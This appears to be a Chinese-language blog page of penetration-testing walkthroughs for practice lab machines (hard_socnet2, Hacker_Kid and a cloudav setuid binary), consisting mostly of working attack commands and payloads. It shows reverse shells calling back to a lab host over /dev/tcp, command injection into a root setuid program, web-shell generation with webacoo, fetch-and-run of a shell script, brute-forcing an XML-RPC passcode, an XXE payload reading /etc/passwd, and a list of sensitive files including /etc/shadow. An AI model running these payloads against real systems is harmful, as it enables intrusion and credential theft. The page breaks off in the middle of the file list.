<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">scanner@cloudav:~$ ls -alh</span><br><span class="line">ls -alh</span><br><span class="line">total 60K</span><br><span class="line">drwxr-xr-x 6 scanner scanner 4.0K Oct 24  2018 .</span><br><span class="line">drwxr-xr-x 4 root    root    4.0K Oct 21  2018 ..</span><br><span class="line">-rw------- 1 scanner scanner    5 Oct 24  2018 .bash_history</span><br><span class="line">-rw-r--r-- 1 scanner scanner  220 Oct 21  2018 .bash_logout</span><br><span class="line">-rw-r--r-- 1 scanner scanner 3.7K Oct 21  2018 .bashrc</span><br><span class="line">drwx------ 2 scanner scanner 4.0K Oct 21  2018 .cache</span><br><span class="line">drwxrwxr-x 4 scanner scanner 4.0K Oct 24  2018 cloudav_app</span><br><span class="line">drwx------ 3 scanner scanner 4.0K Oct 21  2018 .gnupg</span><br><span class="line">drwxrwxr-x 3 scanner scanner 4.0K Oct 21  2018 .local</span><br><span class="line">-rw-r--r-- 1 scanner scanner  807 Oct 21  2018 .profile</span><br><span class="line">-rw-rw-r-- 1 scanner scanner   66 Oct 21  2018 .selected_editor</span><br><span class="line">-rwsr-xr-x 1 root    scanner 8.4K Oct 24  2018 update_cloudav</span><br><span class="line">-rw-rw-r-- 1 scanner scanner  393 Oct 24  2018 update_cloudav.c</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">char</span> *freshclam=<span class="string">&quot;/usr/bin/freshclam&quot;</span>;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> (argc &lt; <span class="number">2</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;This tool lets you update antivirus rules\nPlease supply command line arguments for freshclam\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">char</span> *command = <span class="built_in">malloc</span>(<span class="built_in">strlen</span>(freshclam) + <span class="built_in">strlen</span>(argv[<span class="number">1</span>]) + <span class="number">2</span>);</span><br><span class="line"><span class="built_in">sprintf</span>(command, <span class="string">&quot;%s %s&quot;</span>, freshclam, argv[<span class="number">1</span>]);</span><br><span class="line">setgid(<span class="number">0</span>);</span><br><span class="line">setuid(<span class="number">0</span>);</span><br><span class="line">system(command);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">touch b.sh &amp;&amp; echo &#x27;bash -i &gt;&amp; /dev/tcp/192.168.56.102/7778 0&gt;&amp;1&#x27; &gt; b.sh &amp;&amp; ./update_cloudav &quot;a | ls | grep &#x27;xxxxx&#x27; | bash b.sh&quot;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">touch b.sh &amp;&amp; echo &#x27;bash -i &gt;&amp; /dev/tcp/192.168.56.102/7778 0&gt;&amp;1&#x27; &gt; b.sh &amp;&amp; ./update_cloudav &quot;a | bash b.sh&quot;</span><br></pre></td></tr></table></figure>

<p><img src="/../images/30-pennnnnnnnnnntest/image-20230715210009244.png" alt="image-20230715210009244"></p>
<h1 id="靶机-hard-socnet2"><a href="#靶机-hard-socnet2" class="headerlink" title="靶机: hard_socnet2"></a>靶机: hard_socnet2</h1><p><a class="link"   target="_blank" rel="noopener" href="https://www.cnblogs.com/shadow-/p/16863184.html" >https://www.cnblogs.com/shadow-/p/16863184.html<i class="fas fa-external-link-alt"></i></a></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">arp-scan -l -I eth0</span><br><span class="line">nmap -A -T4 192.168.56.107</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.56.107/</span><br><span class="line">http://192.168.56.107:8000/</span><br></pre></td></tr></table></figure>





<p>制作木马</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">webacoo -g -o exp.php</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">webacoo -t -u http://192.168.56.107/data/images/posts/9.php</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">webacoo$ id</span><br><span class="line">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span><br><span class="line">webacoo$ uname -a</span><br><span class="line">Linux socnet2 4.15.0-38-generic #41-Ubuntu SMP Wed Oct 10 10:59:38 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -c &#x27;bash -i &gt;&amp; /dev/tcp/192.168.56.102/7778 0&gt;&amp;1&#x27;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">touch 1.sh &amp;&amp; echo &quot;bash -c &#x27;bash -i &gt;&amp; /dev/tcp/192.168.56.102/7778 0&gt;&amp;1&#x27;&quot; &gt; 1.sh &amp;&amp; python3 -m http.server 5000</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget http://192.168.56.102:5000/1.sh &amp;&amp; chmod 777 ./1.sh &amp;&amp; ./1.sh</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &quot;import pty; pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span><br></pre></td></tr></table></figure>



<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#my remote server management API</span></span><br><span class="line"><span class="keyword">import</span> SimpleXMLRPCServer</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line">debugging_pass = random.randint(<span class="number">1000</span>,<span class="number">9999</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">runcmd</span>(<span class="params">cmd</span>):</span><br><span class="line">    results = subprocess.Popen(cmd, shell=<span class="literal">True</span>, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)</span><br><span class="line">    output = results.stdout.read() + results.stderr.read()</span><br><span class="line">    <span class="keyword">return</span> output</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cpu</span>():</span><br><span class="line">    <span class="keyword">return</span> runcmd(<span class="string">&quot;cat /proc/cpuinfo&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">mem</span>():</span><br><span class="line">    <span class="keyword">return</span> runcmd(<span class="string">&quot;free -m&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">disk</span>():</span><br><span class="line">    <span class="keyword">return</span> runcmd(<span class="string">&quot;df -h&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">net</span>():</span><br><span class="line">    <span class="keyword">return</span> runcmd(<span class="string">&quot;ip a&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">secure_cmd</span>(<span class="params">cmd,passcode</span>):</span><br><span class="line">    <span class="keyword">if</span> passcode==debugging_pass:</span><br><span class="line">         <span class="keyword">return</span> runcmd(cmd)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Wrong passcode.&quot;</span></span><br><span class="line"></span><br><span class="line">server = SimpleXMLRPCServer.SimpleXMLRPCServer((<span class="string">&quot;0.0.0.0&quot;</span>, <span class="number">8000</span>))</span><br><span class="line">server.register_function(cpu)</span><br><span class="line">server.register_function(mem)</span><br><span class="line">server.register_function(disk)</span><br><span class="line">server.register_function(net)</span><br><span class="line">server.register_function(secure_cmd)</span><br><span class="line"></span><br><span class="line">server.serve_forever()</span><br></pre></td></tr></table></figure>



<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> xmlrpc.client</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> xmlrpc.client.ServerProxy(<span class="string">&quot;http://192.168.56.107:8000/&quot;</span>) <span class="keyword">as</span> proxy:</span><br><span class="line">    <span class="comment"># print(str(proxy.cpu()))</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># for i in range(1000, 10000):</span></span><br><span class="line">    <span class="comment">#     # print(str(proxy.secure_cmd(&#x27;whoami&#x27;, i)))</span></span><br><span class="line">    <span class="comment">#     if not &quot;Wrong&quot; in str(proxy.secure_cmd(&#x27;whoami&#x27;, i)):</span></span><br><span class="line">    <span class="comment">#         print(i)</span></span><br><span class="line">    <span class="comment">#         break</span></span><br><span class="line"></span><br><span class="line">    res = <span class="built_in">str</span>(proxy.secure_cmd(<span class="string">&#x27;whoami&#x27;</span>, <span class="number">6753</span>))</span><br><span class="line">    <span class="built_in">print</span>(res)</span><br><span class="line"></span><br><span class="line">    res = <span class="built_in">str</span>(proxy.secure_cmd(<span class="string">&#x27;/var/www/html/data/images/posts/1.sh&#x27;</span>, <span class="number">6753</span>))</span><br><span class="line">    <span class="built_in">print</span>(res)</span><br></pre></td></tr></table></figure>

<p><img src="/../images/30-pennnnnnnnnnntest/image-20230715224650252.png" alt="image-20230715224650252"></p>
<p>二次提权：</p>
<p>学pwn去吧（）</p>
<h1 id="靶机-Hacker-Kid-v1-0-1"><a href="#靶机-Hacker-Kid-v1-0-1" class="headerlink" title="靶机: Hacker_Kid-v1.0.1"></a>靶机: Hacker_Kid-v1.0.1</h1><p><a class="link"   target="_blank" rel="noopener" href="https://www.cnblogs.com/shadow-/p/16906028.html" >https://www.cnblogs.com/shadow-/p/16906028.html<i class="fas fa-external-link-alt"></i></a></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">arp-scan -l -I eth0</span><br><span class="line">nmap -A -T4 192.168.56.108</span><br><span class="line">http://192.168.56.108/</span><br><span class="line">http://192.168.56.108:9999/</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">comm -3 &lt;(curl &quot;http://192.168.56.108/&quot; 2&gt;/dev/null) &lt;(curl &quot;http://192.168.56.108/?page_no=0&quot; 2&gt;/dev/null) 2&gt;/dev/null</span><br></pre></td></tr></table></figure>

<ul>
<li>不同之处可以在访问浏览器中发现，也可以通过 <code>curl</code> 请求回返的源码通过 <code>comm</code> 进行比较发现不同的地方<ul>
<li>对比命令中的不同是使用 Process Substitution 将 <code>curl</code> 输出做为 <code>comm</code> 输入类似管道 <code>|</code> 的使用</li>
<li><code>2&gt;/dev/null</code> 作用是将 <strong>标准错误</strong> 重定向到 &#x2F;dev&#x2F;null 文件<ul>
<li><code>/dev/null</code> 是一个特殊的文件，写入到它的内容都会被丢弃，可以理解为垃圾桶</li>
</ul>
</li>
</ul>
</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">comm -3 &lt;(curl &quot;http://192.168.56.108/?page_no=1&quot; 2&gt;/dev/null) &lt;(curl &quot;http://192.168.56.108/?page_no=0&quot; 2&gt;/dev/null) 2&gt;/dev/null</span><br></pre></td></tr></table></figure>

<p>发现结果是一样的，于是写个脚本爆破哪个不一样</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">i=0</span><br><span class="line">while(( $i&lt;=50 ))</span><br><span class="line">do</span><br><span class="line">    j=$((i+1))</span><br><span class="line">    str=`comm -3 \</span><br><span class="line">        &lt;(curl -i &quot;http://192.168.56.108/?page_no=$i&quot; 2&gt;/dev/null) \</span><br><span class="line">        &lt;(curl -i &quot;http://192.168.56.108/?page_no=$j&quot; 2&gt;/dev/null) \</span><br><span class="line">        2&gt;/dev/null`</span><br><span class="line">    if (($&#123;#str&#125; &gt; 0))</span><br><span class="line">    then</span><br><span class="line">        echo $j</span><br><span class="line">        break</span><br><span class="line">    fi</span><br><span class="line">    let &quot;i++&quot;</span><br><span class="line">done</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[/home/kali/Desktop]</span><br><span class="line">└─# bash loop.sh    </span><br><span class="line">21</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">comm -3 &lt;(curl &quot;http://192.168.56.108/?page_no=0&quot; 2&gt;/dev/null) &lt;(curl &quot;http://192.168.56.108/?page_no=21&quot; 2&gt;/dev/null) 2&gt;/dev/null</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[/home/kali/Desktop]</span><br><span class="line">└─# comm -3 &lt;(curl &quot;http://192.168.56.108/?page_no=0&quot; 2&gt;/dev/null) &lt;(curl &quot;http://192.168.56.108/?page_no=21&quot; 2&gt;/dev/null) 2&gt;/dev/null</span><br><span class="line">Oh Man !! Isn&#x27;t is right to go a little deep inside?</span><br><span class="line">&lt;font color=&quot;red&quot;&gt;</span><br><span class="line">&lt;/center&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;!--</span><br><span class="line"></span><br><span class="line">&lt;div class=&quot;container py-5&quot;&gt;</span><br><span class="line">  &lt;h1&gt;Thanks&lt;/h1&gt;</span><br><span class="line"></span><br><span class="line">        Okay so you want me to speak something ?&lt;br&gt;I am a hacker kid not a dumb hacker. So i created some subdomains to return back on the server whenever i want!!&lt;br&gt;Out of my many homes...one such home..one such home for me : hackers.blackhat.local&lt;br&gt;</span><br><span class="line">        &lt;font color=&quot;red&quot;&gt;</span><br><span class="line">        &lt;/center&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        &lt;!--</span><br><span class="line"></span><br><span class="line">        &lt;div class=&quot;container py-5&quot;&gt;</span><br><span class="line">          &lt;h1&gt;Thanks&lt;/h1&gt;</span><br></pre></td></tr></table></figure>





<p>根据提示</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -H &#x27;Host: hackerkid.blackhat.local&#x27; &quot;http://192.168.56.108&quot;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">echo &#x27;</span><br><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;root&gt;</span><br><span class="line">  &lt;name&gt;1&lt;/name&gt;</span><br><span class="line">  &lt;tel&gt;1&lt;/tel&gt;</span><br><span class="line">  &lt;email&gt;xxx@xxx.com&lt;/email&gt;</span><br><span class="line">  &lt;password&gt;1&lt;/password&gt;</span><br><span class="line">&lt;/root&gt;&#x27; \</span><br><span class="line">| curl http://192.168.56.108/process.php \</span><br><span class="line">-H &#x27;Host: hackerkid.blackhat.local&#x27; \</span><br><span class="line">-d @-</span><br></pre></td></tr></table></figure>

<ul>
<li>返回的内容是 <code>Sorry, xxx@xxx.com is not available !!!</code> 其中 <a class="link"   href="mailto:&#x78;&#x78;&#120;&#64;&#x78;&#120;&#x78;&#x2e;&#99;&#x6f;&#109;" >&#x78;&#x78;&#120;&#64;&#x78;&#120;&#x78;&#x2e;&#99;&#x6f;&#109;<i class="fas fa-external-link-alt"></i></a> 经过多次尝试此处是动态回返的</li>
<li>对此我们可以尝试使用 xml 的相关漏洞</li>
</ul>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">drug</span> [<span class="meta">&lt;!ENTITY k <span class="keyword">SYSTEM</span> <span class="string">&#x27;file:///etc/passwd&#x27;</span>&gt;</span>]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span>1<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">tel</span>&gt;</span>1<span class="tag">&lt;/<span class="name">tel</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">email</span>&gt;</span><span class="symbol">&amp;k;</span><span class="tag">&lt;/<span class="name">email</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">password</span>&gt;</span>1<span class="tag">&lt;/<span class="name">password</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure>

<ul>
<li>如果 <code>&lt;!DOCTYPE drug [&lt;!ENTITY k SYSTEM &#39;file:///etc/passwd&#39;&gt;]&gt;</code> 看不懂，可以去查关于 DTD 的内容</li>
<li>在 xml 中包含 DTD 需要使用 DOCTYPE 声明，这个应该好理解，其中 drug 是声明的 <strong>XML 文档构建模块</strong> 名称可以随意</li>
<li>ENTITY 是进行一个外部实体声明，其中 k 只是一个名称，使用 SYSTEM 引入外部资源，所以 k 现在代表 <code>file:///etc/passwd</code></li>
<li>其中 <code>email</code> 标签内容是 k 以此通过请求返回看到系统内部信息</li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">echo &#x27;</span><br><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE drug [&lt;!ENTITY k SYSTEM &quot;file:///etc/passwd&quot;&gt;]&gt;</span><br><span class="line">&lt;root&gt;</span><br><span class="line">    &lt;name&gt;1&lt;/name&gt;</span><br><span class="line">    &lt;tel&gt;1&lt;/tel&gt;</span><br><span class="line">    &lt;email&gt;&amp;k;&lt;/email&gt;</span><br><span class="line">    &lt;password&gt;1&lt;/password&gt;</span><br><span class="line">&lt;/root&gt;&#x27; \</span><br><span class="line">| curl http://192.168.56.108/process.php \</span><br><span class="line">-H &#x27;Host: hackerkid.blackhat.local&#x27; \</span><br><span class="line">-d @-</span><br></pre></td></tr></table></figure>

<p>成功读取&#x2F;etc&#x2F;passwd</p>
<p>接着爆破，</p>
<p>linux中敏感文件file.txt</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br></pre></td><td class="code"><pre><span class="line">/apache/apache/conf/httpd.conf</span><br><span class="line">/apache/apache2/conf/httpd.conf</span><br><span class="line">/apache/php/php.ini</span><br><span class="line">/etc/anacrontab</span><br><span class="line">/etc/apache/apache.conf</span><br><span class="line">/etc/apache/httpd.conf</span><br><span class="line">/etc/apache2/apache.conf</span><br><span class="line">/etc/apache2/httpd.conf</span><br><span class="line">/etc/apache2/sites-available/default</span><br><span class="line">/etc/apache2/vhosts.d/00_default_vhost.conf</span><br><span class="line">/etc/at.allow</span><br><span class="line">/etc/at.deny</span><br><span class="line">/etc/cron.allow</span><br><span class="line">/etc/cron.deny</span><br><span class="line">/etc/crontab</span><br><span class="line">/etc/fstab</span><br><span class="line">/etc/host.conf</span><br><span class="line">/etc/httpd/conf.d/httpd.conf</span><br><span class="line">/etc/httpd/conf.d/php.conf</span><br><span class="line">/etc/httpd/conf/httpd.conf</span><br><span class="line">/etc/httpd/htdocs/index.html</span><br><span class="line">/etc/httpd/htdocs/index.php</span><br><span class="line">/etc/httpd/logs/access.log</span><br><span class="line">/etc/httpd/logs/access_log</span><br><span class="line">/etc/httpd/logs/error.log</span><br><span class="line">/etc/httpd/logs/error_log</span><br><span class="line">/etc/httpd/php.ini</span><br><span class="line">/etc/init.d/httpd</span><br><span class="line">/etc/init.d/mysql</span><br><span class="line">/etc/ld.so.conf</span><br><span class="line">/etc/motd</span><br><span class="line">/etc/my.cnf</span><br><span class="line">/etc/mysql/my.cnf</span><br><span class="line">/etc/mysql/my.cnf</span><br><span class="line">/etc/network/interfaces</span><br><span class="line">/etc/networks</span><br><span class="line">/etc/passwd</span><br><span class="line">/etc/php.ini</span><br><span class="line">/etc/php/apache/php.ini</span><br><span class="line">/etc/php/apache2/php.ini</span><br><span class="line">/etc/php/cgi/php.ini</span><br><span class="line">/etc/php/php.ini</span><br><span class="line">/etc/php/php4/php.ini</span><br><span class="line">/etc/php4.4/fcgi/php.ini</span><br><span class="line">/etc/php4/apache/php.ini</span><br><span class="line">/etc/php4/apache2/php.ini</span><br><span class="line">/etc/php4/cgi/php.ini</span><br><span class="line">/etc/php5/apache/php.ini</span><br><span class="line">/etc/php5/apache2/php.ini</span><br><span class="line">/etc/php5/cgi/php.ini</span><br><span class="line">/etc/phpmyadmin/config.inc.php</span><br><span class="line">/etc/resolv.conf</span><br><span class="line">/etc/shadow</span><br><span class="line">/etc/ssh/sshd_config</span><br><span 